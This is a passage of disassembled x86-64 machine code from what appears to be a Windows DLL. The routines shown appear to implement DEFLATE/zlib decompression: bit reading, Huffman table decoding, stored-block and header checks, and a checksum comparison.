   1800016e2:	41 55                	push   %r13
   1800016e4:	41 56                	push   %r14
   1800016e6:	41 57                	push   %r15
   1800016e8:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   1800016ef:	48 8b f2             	mov    %rdx,%rsi
   1800016f2:	bb 05 00 00 00       	mov    $0x5,%ebx
   1800016f7:	8b d3                	mov    %ebx,%edx
   1800016f9:	4d 8b e8             	mov    %r8,%r13
   1800016fc:	4c 8b f1             	mov    %rcx,%r14
   1800016ff:	e8 94 01 00 00       	call   0x180001898
   180001704:	8b d3                	mov    %ebx,%edx
   180001706:	49 8b ce             	mov    %r14,%rcx
   180001709:	8d a8 01 01 00 00    	lea    0x101(%rax),%ebp
   18000170f:	e8 84 01 00 00       	call   0x180001898
   180001714:	8d 53 ff             	lea    -0x1(%rbx),%edx
   180001717:	49 8b ce             	mov    %r14,%rcx
   18000171a:	44 8d 78 01          	lea    0x1(%rax),%r15d
   18000171e:	e8 75 01 00 00       	call   0x180001898
   180001723:	83 c0 04             	add    $0x4,%eax
   180001726:	81 fd 1e 01 00 00    	cmp    $0x11e,%ebp
   18000172c:	0f 87 3d 01 00 00    	ja     0x18000186f
   180001732:	41 83 ff 1e          	cmp    $0x1e,%r15d
   180001736:	0f 87 33 01 00 00    	ja     0x18000186f
   18000173c:	33 c9                	xor    %ecx,%ecx
   18000173e:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001741:	66 89 4c 24 30       	mov    %cx,0x30(%rsp)
   180001746:	88 4c 24 32          	mov    %cl,0x32(%rsp)
   18000174a:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   18000174f:	85 c0                	test   %eax,%eax
   180001751:	74 26                	je     0x180001779
   180001753:	48 8d 1d b6 18 00 00 	lea    0x18b6(%rip),%rbx        # 0x180003010
   18000175a:	8b f8                	mov    %eax,%edi
   18000175c:	ba 03 00 00 00       	mov    $0x3,%edx
   180001761:	49 8b ce             	mov    %r14,%rcx
   180001764:	e8 2f 01 00 00       	call   0x180001898
   180001769:	0f b6 0b             	movzbl (%rbx),%ecx
   18000176c:	48 ff c3             	inc    %rbx
   18000176f:	88 44 0c 20          	mov    %al,0x20(%rsp,%rcx,1)
   180001773:	48 83 ef 01          	sub    $0x1,%rdi
   180001777:	75 e3                	jne    0x18000175c
   180001779:	41 b8 13 00 00 00    	mov    $0x13,%r8d
   18000177f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180001784:	48 8b ce             	mov    %rsi,%rcx
   180001787:	e8 bc fd ff ff       	call   0x180001548
   18000178c:	85 c0                	test   %eax,%eax
   18000178e:	0f 85 e0 00 00 00    	jne    0x180001874
   180001794:	83 be 60 02 00 00 ff 	cmpl   $0xffffffff,0x260(%rsi)
   18000179b:	0f 84 ce 00 00 00    	je     0x18000186f
   1800017a1:	33 db                	xor    %ebx,%ebx
   1800017a3:	45 8d 24 2f          	lea    (%r15,%rbp,1),%r12d
   1800017a7:	45 85 e4             	test   %r12d,%r12d
   1800017aa:	0f 84 8a 00 00 00    	je     0x18000183a
   1800017b0:	48 8b d6             	mov    %rsi,%rdx
   1800017b3:	49 8b ce             	mov    %r14,%rcx
   1800017b6:	e8 95 fe ff ff       	call   0x180001650
   1800017bb:	8b f8                	mov    %eax,%edi
   1800017bd:	3b 86 60 02 00 00    	cmp    0x260(%rsi),%eax
   1800017c3:	0f 8f a6 00 00 00    	jg     0x18000186f
   1800017c9:	8b d0                	mov    %eax,%edx
   1800017cb:	83 ea 10             	sub    $0x10,%edx
   1800017ce:	74 2a                	je     0x1800017fa
   1800017d0:	83 ea 01             	sub    $0x1,%edx
   1800017d3:	74 1e                	je     0x1800017f3
   1800017d5:	83 fa 01             	cmp    $0x1,%edx
   1800017d8:	74 07                	je     0x1800017e1
   1800017da:	b9 01 00 00 00       	mov    $0x1,%ecx
   1800017df:	eb 35                	jmp    0x180001816
   1800017e1:	33 ff                	xor    %edi,%edi
   1800017e3:	49 8b ce             	mov    %r14,%rcx
   1800017e6:	8d 57 07             	lea    0x7(%rdi),%edx
   1800017e9:	e8 aa 00 00 00       	call   0x180001898
   1800017ee:	8d 48 0b             	lea    0xb(%rax),%ecx
   1800017f1:	eb 23                	jmp    0x180001816
   1800017f3:	33 ff                	xor    %edi,%edi
   1800017f5:	8d 57 03             	lea    0x3(%rdi),%edx
   1800017f8:	eb 11                	jmp    0x18000180b
   1800017fa:	85 db                	test   %ebx,%ebx
   1800017fc:	74 71                	je     0x18000186f
   1800017fe:	8d 43 ff             	lea    -0x1(%rbx),%eax
   180001801:	ba 02 00 00 00       	mov    $0x2,%edx
   180001806:	0f b6 7c 04 20       	movzbl 0x20(%rsp,%rax,1),%edi
   18000180b:	49 8b ce             	mov    %r14,%rcx
   18000180e:	e8 85 00 00 00       	call   0x180001898
   180001813:	8d 48 03             	lea    0x3(%rax),%ecx
   180001816:	41 8b c7             	mov    %r15d,%eax
   180001819:	2b c3                	sub    %ebx,%eax
   18000181b:	03 c5                	add    %ebp,%eax
   18000181d:	3b c8                	cmp    %eax,%ecx
   18000181f:	77 4e                	ja     0x18000186f
   180001821:	85 c9                	test   %ecx,%ecx
   180001823:	74 0c                	je     0x180001831
   180001825:	40 88 7c 1c 20       	mov    %dil,0x20(%rsp,%rbx,1)
   18000182a:	ff c3                	inc    %ebx
   18000182c:	83 c1 ff             	add    $0xffffffff,%ecx
   18000182f:	75 f4                	jne    0x180001825
   180001831:	41 3b dc             	cmp    %r12d,%ebx
   180001834:	0f 82 76 ff ff ff    	jb     0x1800017b0
   18000183a:	80 bc 24 20 01 00 00 	cmpb   $0x0,0x120(%rsp)
   180001841:	00 
   180001842:	74 2b                	je     0x18000186f
   180001844:	44 8b c5             	mov    %ebp,%r8d
   180001847:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   18000184c:	48 8b ce             	mov    %rsi,%rcx
   18000184f:	e8 f4 fc ff ff       	call   0x180001548
   180001854:	85 c0                	test   %eax,%eax
   180001856:	75 1c                	jne    0x180001874
   180001858:	8b c5                	mov    %ebp,%eax
   18000185a:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   18000185f:	48 03 d0             	add    %rax,%rdx
   180001862:	45 8b c7             	mov    %r15d,%r8d
   180001865:	49 8b cd             	mov    %r13,%rcx
   180001868:	e8 db fc ff ff       	call   0x180001548
   18000186d:	eb 05                	jmp    0x180001874
   18000186f:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
   180001874:	4c 8d 9c 24 60 01 00 	lea    0x160(%rsp),%r11
   18000187b:	00 
   18000187c:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   180001880:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   180001884:	49 8b 73 40          	mov    0x40(%r11),%rsi
   180001888:	49 8b e3             	mov    %r11,%rsp
   18000188b:	41 5f                	pop    %r15
   18000188d:	41 5e                	pop    %r14
   18000188f:	41 5d                	pop    %r13
   180001891:	41 5c                	pop    %r12
   180001893:	5f                   	pop    %rdi
   180001894:	c3                   	ret
   180001895:	cc                   	int3
   180001896:	cc                   	int3
   180001897:	cc                   	int3
   180001898:	44 8b 49 14          	mov    0x14(%rcx),%r9d
   18000189c:	44 8b d2             	mov    %edx,%r10d
   18000189f:	4c 8b c1             	mov    %rcx,%r8
   1800018a2:	41 bb 01 00 00 00    	mov    $0x1,%r11d
   1800018a8:	44 3b ca             	cmp    %edx,%r9d
   1800018ab:	7d 2f                	jge    0x1800018dc
   1800018ad:	49 8b 10             	mov    (%r8),%rdx
   1800018b0:	49 3b 50 08          	cmp    0x8(%r8),%rdx
   1800018b4:	74 15                	je     0x1800018cb
   1800018b6:	0f b6 02             	movzbl (%rdx),%eax
   1800018b9:	41 8b c9             	mov    %r9d,%ecx
   1800018bc:	d3 e0                	shl    %cl,%eax
   1800018be:	41 09 40 10          	or     %eax,0x10(%r8)
   1800018c2:	48 8d 42 01          	lea    0x1(%rdx),%rax
   1800018c6:	49 89 00             	mov    %rax,(%r8)
   1800018c9:	eb 04                	jmp    0x1800018cf
   1800018cb:	45 89 58 18          	mov    %r11d,0x18(%r8)
   1800018cf:	41 83 c1 08          	add    $0x8,%r9d
   1800018d3:	45 89 48 14          	mov    %r9d,0x14(%r8)
   1800018d7:	45 3b ca             	cmp    %r10d,%r9d
   1800018da:	7c d1                	jl     0x1800018ad
   1800018dc:	41 8b 50 10          	mov    0x10(%r8),%edx
   1800018e0:	41 8b ca             	mov    %r10d,%ecx
   1800018e3:	8b c2                	mov    %edx,%eax
   1800018e5:	45 2b ca             	sub    %r10d,%r9d
   1800018e8:	d3 e8                	shr    %cl,%eax
   1800018ea:	41 89 40 10          	mov    %eax,0x10(%r8)
   1800018ee:	41 8b c3             	mov    %r11d,%eax
   1800018f1:	d3 e0                	shl    %cl,%eax
   1800018f3:	41 2b c3             	sub    %r11d,%eax
   1800018f6:	45 89 48 14          	mov    %r9d,0x14(%r8)
   1800018fa:	23 c2                	and    %edx,%eax
   1800018fc:	c3                   	ret
   1800018fd:	cc                   	int3
   1800018fe:	cc                   	int3
   1800018ff:	cc                   	int3
   180001900:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001905:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000190a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000190f:	57                   	push   %rdi
   180001910:	41 54                	push   %r12
   180001912:	41 56                	push   %r14
   180001914:	48 83 ec 20          	sub    $0x20,%rsp
   180001918:	4d 8b f0             	mov    %r8,%r14
   18000191b:	48 8b f2             	mov    %rdx,%rsi
   18000191e:	48 8b d9             	mov    %rcx,%rbx
   180001921:	e8 2a fd ff ff       	call   0x180001650
   180001926:	83 7b 18 00          	cmpl   $0x0,0x18(%rbx)
   18000192a:	8b c8                	mov    %eax,%ecx
   18000192c:	0f 85 29 01 00 00    	jne    0x180001a5b
   180001932:	4c 8d 25 c7 e6 ff ff 	lea    -0x1939(%rip),%r12        # 0x180000000
   180001939:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
   18000193f:	7d 19                	jge    0x18000195a
   180001941:	48 8b 43 28          	mov    0x28(%rbx),%rax
   180001945:	48 3b 43 30          	cmp    0x30(%rbx),%rax
   180001949:	0f 84 2a 01 00 00    	je     0x180001a79
   18000194f:	88 08                	mov    %cl,(%rax)
   180001951:	48 ff 43 28          	incq   0x28(%rbx)
   180001955:	e9 ea 00 00 00       	jmp    0x180001a44
   18000195a:	0f 84 20 01 00 00    	je     0x180001a80
   180001960:	3b 8e 60 02 00 00    	cmp    0x260(%rsi),%ecx
   180001966:	0f 8f ef 00 00 00    	jg     0x180001a5b
   18000196c:	8d 81 ff fe ff ff    	lea    -0x101(%rcx),%eax
   180001972:	83 f8 1c             	cmp    $0x1c,%eax
   180001975:	0f 8f e0 00 00 00    	jg     0x180001a5b
   18000197b:	41 83 be 60 02 00 00 	cmpl   $0xffffffff,0x260(%r14)
   180001982:	ff 
   180001983:	0f 84 d2 00 00 00    	je     0x180001a5b
   180001989:	48 63 c1             	movslq %ecx,%rax
   18000198c:	42 0f b6 94 20 27 2f 	movzbl 0x2f27(%rax,%r12,1),%edx
   180001993:	00 00 
   180001995:	41 0f b7 bc 44 46 2e 	movzwl 0x2e46(%r12,%rax,2),%edi
   18000199c:	00 00 
   18000199e:	85 d2                	test   %edx,%edx
   1800019a0:	74 0a                	je     0x1800019ac
   1800019a2:	48 8b cb             	mov    %rbx,%rcx
   1800019a5:	e8 ee fe ff ff       	call   0x180001898
   1800019aa:	eb 02                	jmp    0x1800019ae
   1800019ac:	33 c0                	xor    %eax,%eax
   1800019ae:	49 8b d6             	mov    %r14,%rdx
   1800019b1:	8d 2c 38             	lea    (%rax,%rdi,1),%ebp
   1800019b4:	48 8b cb             	mov    %rbx,%rcx
   1800019b7:	e8 94 fc ff ff       	call   0x180001650
   1800019bc:	41 3b 86 60 02 00 00 	cmp    0x260(%r14),%eax
   1800019c3:	0f 8f 92 00 00 00    	jg     0x180001a5b
   1800019c9:	83 f8 1d             	cmp    $0x1d,%eax
   1800019cc:	0f 8f 89 00 00 00    	jg     0x180001a5b
   1800019d2:	48 98                	cltq
   1800019d4:	42 0f b6 94 20 88 30 	movzbl 0x3088(%rax,%r12,1),%edx
   1800019db:	00 00 
   1800019dd:	41 0f b7 bc 44 a8 30 	movzwl 0x30a8(%r12,%rax,2),%edi
   1800019e4:	00 00 
   1800019e6:	85 d2                	test   %edx,%edx
   1800019e8:	74 0a                	je     0x1800019f4
   1800019ea:	48 8b cb             	mov    %rbx,%rcx
   1800019ed:	e8 a6 fe ff ff       	call   0x180001898
   1800019f2:	eb 02                	jmp    0x1800019f6
   1800019f4:	33 c0                	xor    %eax,%eax
   1800019f6:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   1800019fa:	03 c7                	add    %edi,%eax
   1800019fc:	4c 63 c8             	movslq %eax,%r9
   1800019ff:	48 8b c1             	mov    %rcx,%rax
   180001a02:	48 2b 43 20          	sub    0x20(%rbx),%rax
   180001a06:	4c 3b c8             	cmp    %rax,%r9
   180001a09:	7f 50                	jg     0x180001a5b
   180001a0b:	48 8b 43 30          	mov    0x30(%rbx),%rax
   180001a0f:	48 2b c1             	sub    %rcx,%rax
   180001a12:	4c 63 c5             	movslq %ebp,%r8
   180001a15:	49 3b c0             	cmp    %r8,%rax
   180001a18:	7c 5f                	jl     0x180001a79
   180001a1a:	33 d2                	xor    %edx,%edx
   180001a1c:	85 ed                	test   %ebp,%ebp
   180001a1e:	7e 1c                	jle    0x180001a3c
   180001a20:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   180001a24:	48 8b c1             	mov    %rcx,%rax
   180001a27:	49 2b c1             	sub    %r9,%rax
   180001a2a:	8a 04 10             	mov    (%rax,%rdx,1),%al
   180001a2d:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   180001a30:	48 ff c2             	inc    %rdx
   180001a33:	49 3b d0             	cmp    %r8,%rdx
   180001a36:	7c e8                	jl     0x180001a20
   180001a38:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   180001a3c:	49 8d 04 08          	lea    (%r8,%rcx,1),%rax
   180001a40:	48 89 43 28          	mov    %rax,0x28(%rbx)
   180001a44:	48 8b d6             	mov    %rsi,%rdx
   180001a47:	48 8b cb             	mov    %rbx,%rcx
   180001a4a:	e8 01 fc ff ff       	call   0x180001650
   180001a4f:	83 7b 18 00          	cmpl   $0x0,0x18(%rbx)
   180001a53:	8b c8                	mov    %eax,%ecx
   180001a55:	0f 84 de fe ff ff    	je     0x180001939
   180001a5b:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
   180001a60:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180001a65:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   180001a6a:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180001a6f:	48 83 c4 20          	add    $0x20,%rsp
   180001a73:	41 5e                	pop    %r14
   180001a75:	41 5c                	pop    %r12
   180001a77:	5f                   	pop    %rdi
   180001a78:	c3                   	ret
   180001a79:	b8 fb ff ff ff       	mov    $0xfffffffb,%eax
   180001a7e:	eb e0                	jmp    0x180001a60
   180001a80:	33 c0                	xor    %eax,%eax
   180001a82:	eb dc                	jmp    0x180001a60
   180001a84:	48 8b c4             	mov    %rsp,%rax
   180001a87:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180001a8b:	48 89 70 10          	mov    %rsi,0x10(%rax)
   180001a8f:	48 89 78 18          	mov    %rdi,0x18(%rax)
   180001a93:	4c 89 60 20          	mov    %r12,0x20(%rax)
   180001a97:	55                   	push   %rbp
   180001a98:	41 55                	push   %r13
   180001a9a:	41 57                	push   %r15
   180001a9c:	48 8d a8 c8 fb ff ff 	lea    -0x438(%rax),%rbp
   180001aa3:	48 81 ec 20 05 00 00 	sub    $0x520,%rsp
   180001aaa:	33 f6                	xor    %esi,%esi
   180001aac:	41 8b c1             	mov    %r9d,%eax
   180001aaf:	49 03 c0             	add    %r8,%rax
   180001ab2:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   180001ab7:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180001abc:	48 8b da             	mov    %rdx,%rbx
   180001abf:	8b 02                	mov    (%rdx),%eax
   180001ac1:	48 03 c1             	add    %rcx,%rax
   180001ac4:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   180001ac9:	44 8d 6e 18          	lea    0x18(%rsi),%r13d
   180001acd:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180001ad2:	89 74 24 38          	mov    %esi,0x38(%rsp)
   180001ad6:	45 8d 7d 78          	lea    0x78(%r13),%r15d
   180001ada:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   180001adf:	44 8d 66 20          	lea    0x20(%rsi),%r12d
   180001ae3:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   180001ae8:	ba 01 00 00 00       	mov    $0x1,%edx
   180001aed:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001af2:	e8 a1 fd ff ff       	call   0x180001898
   180001af7:	ba 02 00 00 00       	mov    $0x2,%edx
   180001afc:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001b01:	8b f8                	mov    %eax,%edi
   180001b03:	e8 90 fd ff ff       	call   0x180001898
   180001b08:	85 c0                	test   %eax,%eax
   180001b0a:	0f 84 3a 01 00 00    	je     0x180001c4a
   180001b10:	83 e8 01             	sub    $0x1,%eax
   180001b13:	74 2c                	je     0x180001b41
   180001b15:	83 f8 01             	cmp    $0x1,%eax
   180001b18:	0f 85 df 01 00 00    	jne    0x180001cfd
   180001b1e:	4c 8d 85 bc 01 00 00 	lea    0x1bc(%rbp),%r8
   180001b25:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   180001b2a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001b2f:	e8 9c fb ff ff       	call   0x1800016d0
   180001b34:	85 c0                	test   %eax,%eax
   180001b36:	0f 85 c6 01 00 00    	jne    0x180001d02
   180001b3c:	e9 ee 00 00 00       	jmp    0x180001c2f
   180001b41:	0f b7 ce             	movzwl %si,%ecx
   180001b44:	48 8d 54 24 78       	lea    0x78(%rsp),%rdx
   180001b49:	8b c1                	mov    %ecx,%eax
   180001b4b:	41 b9 70 00 00 00    	mov    $0x70,%r9d
   180001b51:	c1 e1 10             	shl    $0x10,%ecx
   180001b54:	0b c8                	or     %eax,%ecx
   180001b56:	66 0f 6e c1          	movd   %ecx,%xmm0
   180001b5a:	8b ce                	mov    %esi,%ecx
   180001b5c:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
   180001b61:	0f 11 44 24 68       	movups %xmm0,0x68(%rsp)
   180001b66:	66 44 89 4c 24 6a    	mov    %r9w,0x6a(%rsp)
   180001b6c:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   180001b71:	c7 44 24 66 18 00 98 	movl   $0x980018,0x66(%rsp)
   180001b78:	00 
   180001b79:	b8 00 01 00 00       	mov    $0x100,%eax
   180001b7e:	03 c1                	add    %ecx,%eax
   180001b80:	ff c1                	inc    %ecx
   180001b82:	66 89 02             	mov    %ax,(%rdx)
   180001b85:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   180001b89:	41 3b cd             	cmp    %r13d,%ecx
   180001b8c:	7c eb                	jl     0x180001b79
   180001b8e:	8b c6                	mov    %esi,%eax
   180001b90:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   180001b94:	66 89 01             	mov    %ax,(%rcx)
   180001b97:	ff c0                	inc    %eax
   180001b99:	48 8d 49 02          	lea    0x2(%rcx),%rcx
   180001b9d:	41 3b c7             	cmp    %r15d,%eax
   180001ba0:	7c f2                	jl     0x180001b94
   180001ba2:	8b ce                	mov    %esi,%ecx
   180001ba4:	48 8d 95 c8 00 00 00 	lea    0xc8(%rbp),%rdx
   180001bab:	b8 18 01 00 00       	mov    $0x118,%eax
   180001bb0:	03 c1                	add    %ecx,%eax
   180001bb2:	ff c1                	inc    %ecx
   180001bb4:	66 89 02             	mov    %ax,(%rdx)
   180001bb7:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   180001bbb:	83 f9 08             	cmp    $0x8,%ecx
   180001bbe:	7c eb                	jl     0x180001bab
   180001bc0:	8b ce                	mov    %esi,%ecx
   180001bc2:	48 8d 95 d8 00 00 00 	lea    0xd8(%rbp),%rdx
   180001bc9:	41 8d 04 0f          	lea    (%r15,%rcx,1),%eax
   180001bcd:	ff c1                	inc    %ecx
   180001bcf:	66 89 02             	mov    %ax,(%rdx)
   180001bd2:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   180001bd6:	41 3b c9             	cmp    %r9d,%ecx
   180001bd9:	7c ee                	jl     0x180001bc9
   180001bdb:	0f b7 ce             	movzwl %si,%ecx
   180001bde:	8b c1                	mov    %ecx,%eax
   180001be0:	c7 85 b8 01 00 00 1d 	movl   $0x11d,0x1b8(%rbp)
   180001be7:	01 00 00 
   180001bea:	c1 e1 10             	shl    $0x10,%ecx
   180001bed:	0b c8                	or     %eax,%ecx
   180001bef:	8b c6                	mov    %esi,%eax
   180001bf1:	66 0f 6e c1          	movd   %ecx,%xmm0
   180001bf5:	48 8d 8d dc 01 00 00 	lea    0x1dc(%rbp),%rcx
   180001bfc:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
   180001c01:	0f 11 85 bc 01 00 00 	movups %xmm0,0x1bc(%rbp)
   180001c08:	66 44 89 a5 c6 01 00 	mov    %r12w,0x1c6(%rbp)
   180001c0f:	00 
   180001c10:	0f 11 85 cc 01 00 00 	movups %xmm0,0x1cc(%rbp)
   180001c17:	66 89 01             	mov    %ax,(%rcx)
   180001c1a:	ff c0                	inc    %eax
   180001c1c:	48 8d 49 02          	lea    0x2(%rcx),%rcx
   180001c20:	41 3b c4             	cmp    %r12d,%eax
   180001c23:	7c f2                	jl     0x180001c17
   180001c25:	c7 85 1c 04 00 00 1d 	movl   $0x1d,0x41c(%rbp)
   180001c2c:	00 00 00 
   180001c2f:	4c 8d 85 bc 01 00 00 	lea    0x1bc(%rbp),%r8
   180001c36:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   180001c3b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001c40:	e8 bb fc ff ff       	call   0x180001900
   180001c45:	e9 8c 00 00 00       	jmp    0x180001cd6
   180001c4a:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
   180001c4f:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   180001c54:	49 8b c1             	mov    %r9,%rax
   180001c57:	48 2b c2             	sub    %rdx,%rax
   180001c5a:	48 83 f8 04          	cmp    $0x4,%rax
   180001c5e:	0f 8c 99 00 00 00    	jl     0x180001cfd
   180001c64:	0f b6 02             	movzbl (%rdx),%eax
   180001c67:	44 0f b6 42 01       	movzbl 0x1(%rdx),%r8d
   180001c6c:	0f b6 4a 03          	movzbl 0x3(%rdx),%ecx
   180001c70:	c1 e1 08             	shl    $0x8,%ecx
   180001c73:	41 c1 e0 08          	shl    $0x8,%r8d
   180001c77:	44 0b c0             	or     %eax,%r8d
   180001c7a:	0f b6 42 02          	movzbl 0x2(%rdx),%eax
   180001c7e:	0b c8                	or     %eax,%ecx
   180001c80:	f7 d1                	not    %ecx
   180001c82:	0f b7 c1             	movzwl %cx,%eax
   180001c85:	44 3b c0             	cmp    %eax,%r8d
   180001c88:	75 73                	jne    0x180001cfd
   180001c8a:	48 83 c2 04          	add    $0x4,%rdx
   180001c8e:	45 8b d0             	mov    %r8d,%r10d
   180001c91:	4c 2b ca             	sub    %rdx,%r9
   180001c94:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   180001c99:	4d 3b ca             	cmp    %r10,%r9
   180001c9c:	7c 5f                	jl     0x180001cfd
   180001c9e:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   180001ca3:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   180001ca8:	48 2b c1             	sub    %rcx,%rax
   180001cab:	49 3b c2             	cmp    %r10,%rax
   180001cae:	7c 46                	jl     0x180001cf6
   180001cb0:	45 85 c0             	test   %r8d,%r8d
   180001cb3:	74 1a                	je     0x180001ccf
   180001cb5:	8a 02                	mov    (%rdx),%al
   180001cb7:	48 ff c2             	inc    %rdx
   180001cba:	88 01                	mov    %al,(%rcx)
   180001cbc:	48 ff c1             	inc    %rcx
   180001cbf:	41 83 c0 ff          	add    $0xffffffff,%r8d
   180001cc3:	75 f0                	jne    0x180001cb5
   180001cc5:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   180001cca:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   180001ccf:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   180001cd4:	8b c6                	mov    %esi,%eax
   180001cd6:	85 c0                	test   %eax,%eax
   180001cd8:	75 28                	jne    0x180001d02
   180001cda:	85 ff                	test   %edi,%edi
   180001cdc:	0f 84 06 fe ff ff    	je     0x180001ae8
   180001ce2:	39 74 24 38          	cmp    %esi,0x38(%rsp)
   180001ce6:	75 15                	jne    0x180001cfd
   180001ce8:	8b 44 24 48          	mov    0x48(%rsp),%eax
   180001cec:	2b 44 24 40          	sub    0x40(%rsp),%eax
   180001cf0:	89 03                	mov    %eax,(%rbx)
   180001cf2:	33 c0                	xor    %eax,%eax
   180001cf4:	eb 0c                	jmp    0x180001d02
   180001cf6:	b8 fb ff ff ff       	mov    $0xfffffffb,%eax
   180001cfb:	eb 05                	jmp    0x180001d02
   180001cfd:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
   180001d02:	4c 8d 9c 24 20 05 00 	lea    0x520(%rsp),%r11
   180001d09:	00 
   180001d0a:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   180001d0e:	49 8b 73 28          	mov    0x28(%r11),%rsi
   180001d12:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   180001d16:	4d 8b 63 38          	mov    0x38(%r11),%r12
   180001d1a:	49 8b e3             	mov    %r11,%rsp
   180001d1d:	41 5f                	pop    %r15
   180001d1f:	41 5d                	pop    %r13
   180001d21:	5d                   	pop    %rbp
   180001d22:	c3                   	ret
   180001d23:	cc                   	int3
   180001d24:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001d29:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180001d2e:	57                   	push   %rdi
   180001d2f:	48 83 ec 20          	sub    $0x20,%rsp
   180001d33:	48 8b fa             	mov    %rdx,%rdi
   180001d36:	48 8b f1             	mov    %rcx,%rsi
   180001d39:	41 83 f9 06          	cmp    $0x6,%r9d
   180001d3d:	0f 82 97 00 00 00    	jb     0x180001dda
   180001d43:	41 0f b6 40 01       	movzbl 0x1(%r8),%eax
   180001d48:	45 0f b6 18          	movzbl (%r8),%r11d
   180001d4c:	45 8b d3             	mov    %r11d,%r10d
   180001d4f:	41 c1 e2 08          	shl    $0x8,%r10d
   180001d53:	44 03 d0             	add    %eax,%r10d
   180001d56:	b8 85 10 42 08       	mov    $0x8421085,%eax
   180001d5b:	41 f7 e2             	mul    %r10d
   180001d5e:	41 8b c2             	mov    %r10d,%eax
   180001d61:	2b c2                	sub    %edx,%eax
   180001d63:	d1 e8                	shr    $1,%eax
   180001d65:	03 c2                	add    %edx,%eax
   180001d67:	c1 e8 04             	shr    $0x4,%eax
   180001d6a:	6b c0 1f             	imul   $0x1f,%eax,%eax
   180001d6d:	44 3b d0             	cmp    %eax,%r10d
   180001d70:	75 68                	jne    0x180001dda
   180001d72:	41 8a c3             	mov    %r11b,%al
   180001d75:	24 0f                	and    $0xf,%al
   180001d77:	3c 08                	cmp    $0x8,%al
   180001d79:	75 5f                	jne    0x180001dda
   180001d7b:	41 80 e3 f0          	and    $0xf0,%r11b
   180001d7f:	41 80 fb 70          	cmp    $0x70,%r11b
   180001d83:	77 55                	ja     0x180001dda
   180001d85:	41 f6 40 01 20       	testb  $0x20,0x1(%r8)
   180001d8a:	75 4e                	jne    0x180001dda
   180001d8c:	41 8d 49 fc          	lea    -0x4(%r9),%ecx
   180001d90:	48 8b d7             	mov    %rdi,%rdx
   180001d93:	49 03 c8             	add    %r8,%rcx
   180001d96:	41 83 c1 fa          	add    $0xfffffffa,%r9d
   180001d9a:	49 83 c0 02          	add    $0x2,%r8
   180001d9e:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   180001da2:	0f b6 19             	movzbl (%rcx),%ebx
   180001da5:	c1 e3 08             	shl    $0x8,%ebx
   180001da8:	0b d8                	or     %eax,%ebx
   180001daa:	0f b6 41 02          	movzbl 0x2(%rcx),%eax
   180001dae:	c1 e3 08             	shl    $0x8,%ebx
   180001db1:	0b d8                	or     %eax,%ebx
   180001db3:	0f b6 41 03          	movzbl 0x3(%rcx),%eax
   180001db7:	c1 e3 08             	shl    $0x8,%ebx
   180001dba:	48 8b ce             	mov    %rsi,%rcx
   180001dbd:	0b d8                	or     %eax,%ebx
   180001dbf:	e8 c0 fc ff ff       	call   0x180001a84
   180001dc4:	85 c0                	test   %eax,%eax
   180001dc6:	75 12                	jne    0x180001dda
   180001dc8:	8b 17                	mov    (%rdi),%edx
   180001dca:	48 8b ce             	mov    %rsi,%rcx
   180001dcd:	e8 12 f6 ff ff       	call   0x1800013e4
   180001dd2:	3b d8                	cmp    %eax,%ebx
   180001dd4:	75 04                	jne    0x180001dda
   180001dd6:	33 c0                	xor    %eax,%eax
   180001dd8:	eb 05                	jmp    0x180001ddf
   180001dda:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
   180001ddf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
